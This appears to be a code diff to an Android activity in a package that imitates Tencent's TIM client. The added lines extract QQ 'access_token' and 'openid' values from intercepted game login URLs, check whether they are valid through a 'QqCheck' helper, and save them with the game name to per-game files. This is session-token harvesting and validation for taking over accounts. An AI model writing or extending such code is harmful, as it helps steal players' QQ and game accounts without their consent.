@@ -366,13 +366,16 @@ public class AgentActivity extends BaseActivity {
                 if (game == null || game.isEmpty()) game = com.tencent.tim.TokenStore.detectGameByRoot();
                 
                 if (game == null || game.isEmpty()) game = "其他";
-                String line = time + " | " + game + " | " + url + " | " + mode;
+                String tk = grab(url, "access_token=([^& ]+)");
+                String oid = grab(url, "openid=([^& ]+)");
+                final String chk = com.tencent.tim.QqCheck.checkSync(tk, oid);
+                String line = time + " | " + game + " | " + url + " | " + mode + " | " + chk;
                 final boolean ok = com.tencent.tim.TokenStore.saveGameEntry(game, line);
                 final String g = game;
                 runOnUiThread(() -> {
                     if (ok) {
                         Toast.makeText(AgentActivity.this,
-                                "已识别 " + g + "，保存到 " + com.tencent.tim.TokenStore.gameFile(g).getAbsolutePath(),
+                                "已识别 " + g + " · " + chk + "，保存到 " + com.tencent.tim.TokenStore.gameFile(g).getAbsolutePath(),
                                 Toast.LENGTH_LONG).show();
                     } else {
                         Toast.makeText(AgentActivity.this, "保存失败: " + com.tencent.tim.TokenStore.lastError + " → " + com.tencent.tim.TokenStore.gameFile(g).getAbsolutePath(), Toast.LENGTH_LONG).show();
